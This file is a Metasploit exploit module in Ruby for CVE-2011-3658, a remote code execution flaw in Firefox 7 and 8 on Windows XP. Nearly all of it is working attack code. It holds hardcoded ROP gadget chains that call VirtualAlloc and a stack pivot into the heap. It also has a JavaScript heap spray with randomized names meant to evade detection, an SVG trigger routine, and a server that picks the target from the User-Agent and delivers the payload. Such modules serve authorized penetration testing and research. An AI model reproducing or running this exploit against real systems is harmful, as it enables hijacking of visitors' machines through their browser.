##
2	
# This file is part of the Metasploit Framework and may be subject to
3	
# redistribution and commercial restrictions. Please see the Metasploit
4	
# Framework web site for more information on licensing and terms of use.
5	
#   http://metasploit.com/framework/
6	
##
7	
8	
9	
require 'msf/core'
10	
11	
class Metasploit3 < Msf::Exploit::Remote
12	
13	
        Rank = NormalRanking
14	
15	
        include Msf::Exploit::Remote::HttpServer::HTML
16	
17	
        def initialize(info = {})
18	
                super(update_info(info,
19	
                        'Name'           => 'Firefox 7 and 8 (<= 8.0.1) nsSVGValue Out-of-Bounds Access RCE',
20	
                        'Description'    => %q{
21	
                                        This module exploits an out of bounds access flaw in Firefox 7 and 8 (<= 8.0.1)
22	
                                        The notification of nsSVGValue observers via nsSVGValue::NotifyObservers(x,y)
23	
                                        uses a loop which can result in an out-of-bounds access to attacker controlled memory.
24	
                                        The mObserver ElementAt() function (which picks up pointers), does not validate
25	
                                        if a given index is out of bound. If a custom observer of nsSVGValue is created,
26	
                                        which removes elements from the original observer,
27	
                                        and memory layout is manipulated properly, the ElementAt() function might pick up
28	
                                        an attacker provided pointer, which can be leveraged to gain remote arbitrary code execution.
29	
30	
                        },
31	
                        'License'        => MSF_LICENSE,
32	
                        'Author'         =>         [
33	
                                                'regenrecht', #vulnerability discovery
34	
                                                'Lincoln<lincoln[at]corelan.be>',        #Metasploit module
35	
                                                'corelanc0d3r<peter.ve[at]corelan.be>' #Metasploit module
36	
                                                ],
37	
                        'References'     =>
38	
                                [
39	
                                        [ 'CVE', 'CVE-2011-3658' ],
40	
                                        [ 'ZDI', 'http://www.zerodayinitiative.com/advisories/ZDI-12-056/' ],
41	
                                        [ 'URL', 'https://bugzilla.mozilla.org/show_bug.cgi?id=708186' ],
42	
                                ],
43	
                        'DefaultOptions' =>
44	
                                {
45	
                                        'EXITFUNC' => 'process',
46	
                                        'InitialAutoRunScript' => 'migrate -f',
47	
                                },
48	
                        'Payload'        =>
49	
                                {
50	
                                        'BadChars'       => "\x00\x0a\x0d\x34",
51	
                                        'DisableNops'         => true,
52	
                                        'PrependEncoder' => "\x81\xc4\x24\xfa\xff\xff",
53	
                                },
54	
                        'Platform'       => 'win',
55	
                        'Targets'        =>
56	
                                [
57	
                                        [ 'Automatic', {} ],
58	
                                        [ 'Windows XP - Firefox 7',
59	
                                                {
60	
                                                'Ret' => 0x0C0C0C0C,
61	
                                                'OffSet' => 0x606,
62	
                                                'Size' => 0x40000,
63	
                                                'PopEax' => 0x7819e4b4, # POP EAX # RETN [MOZCRT19.dll]
64	
                                                'FF' => 7,
65	
                                                'OS' => 'XP'
66	
                                                }
67	
                                        ],
68	
                                        [ 'Windows XP - Firefox 8 (<= 8.0.1)',
69	
                                                {
70	
                                                'Ret' => 0x0C0C0C0C,
71	
                                                'OffSet' => 0x606,
72	
                                                'Size' => 0x40000,
73	
                                                'PopEax' => 0x7819e504, # POP EAX # RETN [MOZCRT19.dll]
74	
                                                'FF' => 8,
75	
                                                'OS' => 'XP'
76	
                                                }
77	
                                        ]
78	
                                ],
79	
                        'DisclosureDate' => 'Dec 6 2011',
80	
                        'DefaultTarget'  => 0))
81	
82	
        end
83	
84	
        def autofilter
85	
                false
86	
        end
87	
88	
        def check_dependencies
89	
                use_zlib
90	
        end
91	
92	
93	
        def junk(n=4)
94	
                return rand_text_alpha_upper(n).unpack("L")[0].to_i
95	
        end
96	
97	
98	
        def nop
99	
                return make_nops(4).unpack("L")[0].to_i
100	
        end
101	
102	
        def get_rop_chain(ffversion,osversion)
103	
104	
                # mona.py ROP chains
105	
106	
                rop_chain = []
107	
108	
                if ffversion == 7 and osversion == "XP"
109	
110	
                        rop_chain =
111	
                        [
112	
                                0x781a909c,     # ptr to &VirtualAlloc() [IAT MOZCRT19.dll]
113	
                                0x7813aeed,     # MOV EAX,DWORD PTR DS:[EAX] # RETN [MOZCRT19.dll]
114	
                                0x78194774,     # PUSH EAX # POP ESI # POP EDI # POP EBP # POP EBX # RETN [MOZCRT19.dll]
115	
                                0x78139801,     # RETN (ROP NOP) [MOZCRT19.dll] -> edi
116	
                                0x78195375,     # & push esp #  ret  [MOZCRT19.dll] -> ebp
117	
                                0x00000001,     # 0x00000001-> ebx
118	
                                0x7819966e,     # POP EDX # RETN [MOZCRT19.dll]
119	
                                0x00001000,     # 0x00001000-> edx
120	
                                0x7813557f,     # POP ECX # RETN [MOZCRT19.dll]
121	
                                0x00000040,     # 0x00000040-> ecx
122	
                                0x781a4da8,     # POP EAX # RETN [MOZCRT19.dll]
123	
                                nop,             # nop
124	
                                0x7813d647,     # PUSHAD # RETN [MOZCRT19.dll]
125	
                        ].flatten.pack("V*")
126	
127	
                elsif ffversion == 8 and osversion == "XP"
128	
129	
                        rop_chain =
130	
                        [
131	
                                0x781a909c,        # ptr to &VirtualAlloc() [IAT MOZCRT19.dll]
132	
                                0x7813af5d,        # MOV EAX,DWORD PTR DS:[EAX] # RETN [MOZCRT19.dll]
133	
                                0x78197f06,        # XCHG EAX,ESI # RETN [MOZCRT19.dll]
134	
                                0x7814eef1,        # POP EBP # RETN [MOZCRT19.dll]
135	
                                0x781503c3,        # & call esp [MOZCRT19.dll]
136	
                                0x781391d0,        # POP EBX # RETN [MOZCRT19.dll]
137	
                                0x00000001,        # 0x00000001-> ebx
138	
                                0x781a147c,        # POP EDX # RETN [MOZCRT19.dll]
139	
                                0x00001000,        # 0x00001000-> edx
140	
                                0x7819728e,        # POP ECX # RETN [MOZCRT19.dll]
141	
                                0x00000040,        # 0x00000040-> ecx
142	
                                0x781945b5,        # POP EDI # RETN [MOZCRT19.dll]
143	
                                0x78152809,        # RETN (ROP NOP) [MOZCRT19.dll]
144	
                                0x7819ce58,        # POP EAX # RETN [MOZCRT19.dll]
145	
                                nop,                # nop
146	
                                0x7813d6b7,        # PUSHAD # RETN [MOZCRT19.dll]
147	
                        ].flatten.pack("V*")
148	
149	
                end
150	
151	
                return rop_chain
152	
153	
154	
        end
155	
156	
157	
        def on_request_uri(cli, request)
158	
                # Re-generate the payload.
159	
                return if ((p = regenerate_payload(cli)) == nil)
160	
161	
                # determine the target FF and OS version
162	
163	
                ffversion = ""
164	
                osversion = ""
165	
166	
                agent = request.headers['User-Agent']
167	
168	
                if agent !~ /Firefox\/7\.0/ and agent !~ /Firefox\/8\.0/ and agent !~ /Firefox\/8\.0\.1/
169	
                        vprint_error("This browser version is not supported: #{agent.to_s}")
170	
                        send_not_found(cli)
171	
                        return
172	
                end
173	
174	
                my_target = target
175	
                if my_target.name == 'Automatic'
176	
                        if agent =~ /NT 5\.1/ and agent =~ /Firefox\/7/
177	
                                my_target = targets[1]
178	
                        elsif agent =~ /NT 5\.1/ and agent =~ /Firefox\/8/
179	
                                my_target = targets[2]
180	
                        elsif vprint_error("This Operating System is not supported: #{agent.to_s}")
181	
                                send_not_found(cli)
182	
                                return
183	
                        end
184	
                        target = my_target
185	
                end
186	
187	
                # Create the payload
188	
                print_status("Creating payload for #{target.name}")
189	
                table =
190	
                [
191	
                        0x0c0c0c0c,        # index
192	
                        0x0c0c0c0c,        # index
193	
                        0x0c0c0c0c,        # index
194	
                        0x7c45abdf,        # Stack->Heap Flip XCHG EAX,ESP # ADD [EAX],EAX # ADD ESP,48h # RETN 28 [MOZCPP19.DLL]
195	
                ].pack("V*")
196	
197	
                rop = rand_text_alpha_upper(56)
198	
                rop << [ target['PopEax'] ].pack("V")
199	
                rop <<        rand_text_alpha_upper(40)
200	
                rop << get_rop_chain(target['FF'],target['OS'])
201	
202	
                # Encode table, chain and payload
203	
                rop_js = Rex::Text.to_unescape(table+rop, Rex::Arch.endian(target.arch))
204	
205	
                code = payload.encoded
206	
                code_js = Rex::Text.to_unescape(code, Rex::Arch.endian(target.arch))
207	
208	
                # random JavaScript variable names
209	
                i_name                        = rand_text_alpha(rand(10) + 5)
210	
                rop_name                = rand_text_alpha(rand(10) + 5)
211	
                code_name                = rand_text_alpha(rand(10) + 5)
212	
                offset_length_name        = rand_text_alpha(rand(10) + 5)
213	
                randnum1_name                 = rand_text_alpha(rand(10) + 5)
214	
                randnum2_name                 = rand_text_alpha(rand(10) + 5)
215	
                randnum3_name                 = rand_text_alpha(rand(10) + 5)
216	
                randnum4_name                 = rand_text_alpha(rand(10) + 5)
217	
                paddingstr_name                = rand_text_alpha(rand(10) + 5)
218	
                padding_name                = rand_text_alpha(rand(10) + 5)
219	
                junk_offset_name        = rand_text_alpha(rand(10) + 5)
220	
                single_sprayblock_name        = rand_text_alpha(rand(10) + 5)
221	
                sprayblock_name                = rand_text_alpha(rand(10) + 5)
222	
                varname_name                = rand_text_alpha(rand(10) + 5)
223	
                thisvarname_name        = rand_text_alpha(rand(10) + 5)
224	
                container_name                = rand_text_alpha(rand(10) + 5)
225	
                tls_name                = rand_text_alpha(rand(10) + 5)
226	
                tl_name                        = rand_text_alpha(rand(10) + 5)
227	
                rect_name                = rand_text_alpha(rand(10) + 5)
228	
                big_name                = rand_text_alpha(rand(10) + 5)
229	
                small_name                = rand_text_alpha(rand(10) + 5)
230	
                listener_name                = rand_text_alpha(rand(10) + 5)
231	
                run_name                = rand_text_alpha(rand(10) + 5)
232	
                svg_name                = rand_text_alpha(rand(10) + 5)
233	
                atl_name                = rand_text_alpha(rand(10) + 5)
234	
                addr_name                = rand_text_alpha(rand(10) + 5)
235	
                trans_name                = rand_text_alpha(rand(10) + 5)
236	
                matrix_name                = rand_text_alpha(rand(10) + 5)
237	
238	
                # corelan precise heap spray for Firefox >= 7
239	
                # + trigger routine
240	
                spray = <<-JS
241	
242	
                var #{rop_name} = unescape("#{rop_js}");
243	
                var #{code_name} = unescape("#{code_js}");
244	
                var #{offset_length_name} = #{target['OffSet']};
245	
246	
                for (var #{i_name}=0; #{i_name} < 0x300; #{i_name}++)
247	
                {
248	
                        var #{randnum1_name}=Math.floor(Math.random()*90)+10;
249	
                        var #{randnum2_name}=Math.floor(Math.random()*90)+10;
250	
                        var #{randnum3_name}=Math.floor(Math.random()*90)+10;
251	
                        var #{randnum4_name}=Math.floor(Math.random()*90)+10;
252	
253	
                        var #{paddingstr_name} = "%u" + #{randnum1_name}.toString() + #{randnum2_name}.toString();
254	
                        #{paddingstr_name} += "%u" + #{randnum3_name}.toString() + #{randnum4_name}.toString();
255	
256	
                        var #{padding_name} = unescape(#{paddingstr_name});        
257	
258	
                        while (#{padding_name}.length < 0x1000) #{padding_name}+= #{padding_name}; 
259	
260	
                        #{junk_offset_name} = #{padding_name}.substring(0, #{offset_length_name}); 
261	
262	
                        var #{single_sprayblock_name} = #{junk_offset_name} + #{rop_name} + #{code_name};
263	
                        #{single_sprayblock_name} += #{padding_name}.substring(0,0x800 - #{offset_length_name} - #{rop_name}.length - #{code_name}.length);
264	
265	
                        while (#{single_sprayblock_name}.length < #{target['Size']}) #{single_sprayblock_name} += #{single_sprayblock_name};
266	
267	
                        #{sprayblock_name} = #{single_sprayblock_name}.substring(0, (#{target['Size']}-6)/2);
268	
269	
                        #{varname_name} = "var" + #{randnum1_name}.toString() + #{randnum2_name}.toString();
270	
                        #{varname_name} += #{randnum3_name}.toString() + #{randnum4_name}.toString() + #{i_name}.toString();
271	
                        #{thisvarname_name} = "var " + #{varname_name} + "= '" + #{sprayblock_name} +"';";
272	
                        eval(#{thisvarname_name});
273	
                }
274	
275	
                var #{container_name} = [];
276	
277	
                var #{tls_name} = [];
278	
                var #{rect_name} = null;
279	
                var #{big_name} = null;
280	
                var #{small_name} = null;
281	
282	
                function #{listener_name}() {
283	
                        #{rect_name}.removeEventListener("DOMAttrModified", #{listener_name}, false);
284	
                        for each (#{tl_name} in #{tls_name})
285	
                        #{tl_name}.clear();
286	
287	
                        for (#{i_name} = 0; #{i_name} < (1<<7); ++#{i_name})
288	
                                #{container_name}.push(unescape(#{big_name}));
289	
                        for (#{i_name} = 0; #{i_name} < (1<<22); ++#{i_name})
290	
                                #{container_name}.push(unescape(#{small_name}));
291	
                }
292	
293	
                function #{run_name}() {
294	
                        var #{svg_name} = document.getElementById("#{svg_name}");
295	
                        #{rect_name} = document.getElementById("#{rect_name}");
296	
297	
                        for (#{i_name} = 0; #{i_name} < (1<<13); ++#{i_name}) {
298	
                                #{rect_name} = #{rect_name}.cloneNode(false);
299	
                                var #{atl_name} = #{rect_name}.transform;
300	
                                var #{tl_name} = #{atl_name}.baseVal;
301	
                                #{tls_name}.push(#{tl_name});
302	
                        }
303	
304	
                        const #{addr_name} = unescape("%u0c0c");
305	
                        #{big_name} = #{addr_name};
306	
                        while (#{big_name}.length != 0x1000)
307	
                        #{big_name} += #{big_name};
308	
309	
                        #{small_name} = #{addr_name};
310	
                        while (#{small_name}.length != 15)
311	
                        #{small_name} += #{addr_name};
312	
313	
                        var #{trans_name} = #{svg_name}.createSVGTransform();
314	
                        for each (#{tl_name} in #{tls_name})
315	
                                #{tl_name}.appendItem(#{trans_name});
316	
317	
                        #{rect_name}.addEventListener("DOMAttrModified", #{listener_name}, false);
318	
                        var #{matrix_name} = #{svg_name}.createSVGMatrix();
319	
                        #{trans_name}.setMatrix(#{matrix_name});
320	
                }
321	
                JS
322	
323	
                # build html
324	
                content = <<-HTML
325	
                <html>
326	
                <head>
327	
                <meta http-equiv="refresh" content="3">
328	
                <body>
329	
                <script language='javascript'>
330	
                #{spray}
331	
                </script>
332	
                </head>
333	
                <body onload="#{run_name}();">
334	
                <svg id="#{svg_name}">
335	
                <rect id="#{rect_name}"        />
336	
                </svg>
337	
                </body>
338	
                </html>
339	
                HTML
340	
341	
                print_status("Sending HTML")
342	
343	
                # Transmit the response to the client
344	
                send_response(cli, content, {'Content-Type'=>'text/html'})
345	
346	
        end
347	
348	
end
